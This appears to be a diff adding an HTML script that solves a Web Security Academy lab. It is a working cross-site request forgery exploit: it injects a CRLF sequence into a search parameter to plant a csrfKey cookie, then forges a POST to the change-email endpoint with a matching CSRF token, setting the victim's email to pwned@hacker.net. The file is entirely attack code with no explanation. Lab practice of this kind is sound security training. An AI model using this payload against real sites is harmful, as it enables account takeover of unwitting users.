@@ -1,0 +1,18 @@
+<script>
+    var labId = '...';
+    var csrfKey = '...';
+    var csrfToken = '...';
+
+    fetch(`https://${labId}.web-security-academy.net/?search=x%0d%0aSet-Cookie:%20csrfKey%3d${csrfKey};%20SameSite=None`, { method: 'GET', mode: 'no-cors', credentials: 'include' })
+    .then((resp) => 
+    {
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        body = new URLSearchParams({
+            'email': 'pwned@hacker.net',
+            'csrf': csrfToken
+        });
+        fetch(`https://${labId}.web-security-academy.net/my-account/change-email`, { method: 'POST', headers: headers, body: body, mode: 'no-cors', credentials: 'include' });
+    });
+</script>
